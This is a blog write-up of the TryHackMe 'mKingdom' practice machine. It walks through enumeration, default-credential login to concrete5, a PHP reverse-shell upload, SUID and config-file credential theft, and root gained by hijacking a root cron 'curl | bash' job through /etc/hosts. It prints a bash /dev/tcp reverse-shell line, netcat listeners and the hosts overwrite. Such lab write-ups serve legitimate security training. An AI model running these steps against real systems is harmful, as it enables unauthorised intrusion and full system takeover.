---
layout: post
title: mKingdom Writeup (TryHackMe)
author: wizarddos
category: writeups
excerpt_separator: <!--more-->
---
Wanna watch a video?
<iframe width="560" height="315" src="https://www.youtube.com/embed/2x0G4RzY2Is?si=YxhnX0GOqCLkK789" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

Another day, another machine. This time we'll try to solve [mKingdom](https://tryhackme.com/r/room/mkingdom)
This is a really new machine for me, as it was published a day or two ago, so off we go.
<!--more-->

### Enumeration

Start with port scan

```
$ rustscan -a $IP -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <http://discord.skerritt.blog>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
😵 <https://admin.tryhackme.com>

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.52.202:85
[~] Starting Script(s)
[...]
PORT   STATE SERVICE REASON  VERSION
85/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN

```

Only one port open? All right, we're going to figure something out.

### Web Enumeration

The index page itself had no interesting information, so I brute-forced directories with `gobuster`

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "<http://$IP:85/>" -x html,js,txt,php -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.10.52.202:85/>
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,js,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
[...]
/app                  (Status: 301) [Size: 312] [--> <http://10.10.52.202:85/app/>]
/index.html           (Status: 200) [Size: 647]
/index.html           (Status: 200) [Size: 647]
/server-status        (Status: 403) [Size: 292]
Progress: 23080 / 23085 (99.98%)
===============================================================
Finished
===============================================================

```

There's `/app` directory - let's visit it

`/app` has just a button, but when we click it, we get redirected to a blog running `concrete5` CMS

Wappalyzer gave us the version - `8.5.2`

### Web Exploiting

I was looking for some exploits online and I've found [this report](https://vulners.com/hackerone/H1:768322)
But it requires a user, which we don't have yet

Yet bit of brute-forcing gave me creds `admin:password`

Now it's time to follow that report - Go to navbar -> `System & Settings` -> `Files` -> `Allowed File Types`
Then edit that input and add `php`

Now go to `Files` in the same nav and upload PHP reverse shell - like the one from [`pentestMonkey`](https://github.com/pentestmonkey/php-reverse-shell)

After upload we see the link - set up a netcat listener

```
$ nc -lvnp 1337

```

Now visit that link and we've got the shell

### Privilege escalation pt.1 - User `toad`

Stabilize your shell with Python.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

```

Now I see that `cat` has SUID permissions as `toad`

```
$ find / -type f -perm -04000 -ls 2>/dev/null
[...]
-rwsr-xr-x 1 toad root 47K Mar 10  2016 /bin/cat
[...]

```

Quick trip to `GTFOBins` assured me that I can read files in `toad` home dir - like `.bashrc`

It gave me something

```
$ /bin/cat /home/toad/.bashrc

[...]
export PWD_token='[TOKEN]'

```

After decoding I got something
Let's save it. It might be useful one day

`LinPeas` gave me as well

```
╔══════════╣ Searching passwords in config PHP files
            'password' => '[REDACTED]',
const USER_CHANGE_PASSWORD_URL_LIFETIME = 7200;
const USER_PASSWORD_RESET = 24;
const UVTYPE_CHANGE_PASSWORD = 1;
            'password_credentials' => t('Password Credentials'),

```

And it's the password for `toad`

```
$ su toad
Password: [REDACTED]

```

### Privilege Escalation pt.2 - User `mario`

Turns out `PWD_TOKEN` which we've found in `/home/toad/.bashrc` is mario's password

Time for root!

### Privilege Escalation pt.3 - Root

Running `pspy` gave me something - every interval some process sends an http request to the domain

```
2024/06/15 17:24:01 CMD: UID=0     PID=12304  | curl mkingdom.thm:85/app/castle/application/counter.sh
2024/06/15 17:24:01 CMD: UID=0     PID=12303  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log

```

We can "hijack" the domain and put in this `counter.sh` another reverse shell as `/etc/hosts` allows us to write something in it

```
$ ls -la /etc/hosts
ls -la /etc/hosts
-rw-rw-r-- 1 root mario 342 Jan 26 19:53 /etc/hosts

```

Let's create a payload first
We need following directory structure

```
/app
  /castle
    /application

```

And inside `application` a file called `counter.sh` with reverse shell

```
bash -i 1>& /dev/tcp/[YOUR IP]/1338 0>&1

```

Now, go back 3 directories and start python web server on port 85

```
$ cd ../../../
$ python3 -m http.server 85

```

After all, in another terminal set up a `netcat` listener

```
$ nc -lvnp 1338

```

Coming back to attacked machine - replace the contents of `/etc/hosts` with an entry for `mkingdom.thm` pointing to your IP

```
$ echo "[YOUR IP]      mkingdom.thm" > /etc/hosts

```

After a while, root shell should appear in our `netcat` listener

```
# whoami
root

```

And that's it - machine pwned!

### Little annotation to flags

Because `cat` has `toad` user as its owner and has SUID bit set, we can't read any flag using it
Luckily `vi` works - use it to read the flags. You can exit it by typing `:q`

## Conclusion

It was tough, I'll be realistic

There was a lot of dead ends and I've struggled to solve it for a while
I'd rate it more as `medium` rather than `easy`, even though mostly it was pretty straight forward

Remember, enumeration is key and don't forget about `pspy`

See you next time!
